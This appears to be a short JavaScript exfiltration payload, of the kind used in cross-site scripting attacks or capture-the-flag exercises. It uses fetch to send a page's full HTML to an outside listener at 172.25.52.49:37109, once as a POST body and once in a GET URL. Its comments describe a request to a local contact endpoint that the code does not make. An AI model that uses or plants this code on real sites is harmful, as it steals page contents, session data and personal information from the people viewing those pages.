// make a post request to http://127.0.0.1:5000/contact with the data: name=page.text
// page.text is the text of the page
// use fetch to make the request

fetch('http://172.25.52.49:37109', {
    method: 'POST',
    headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({ name: document.documentElement.outerHTML })
});

// Get request 2.0 

fetch(`http://172.25.52.49:37109/${document.documentElement.outerHTML}`, {
    method: 'GET',
    headers: {
        'Accept': 'application/json'
    }
});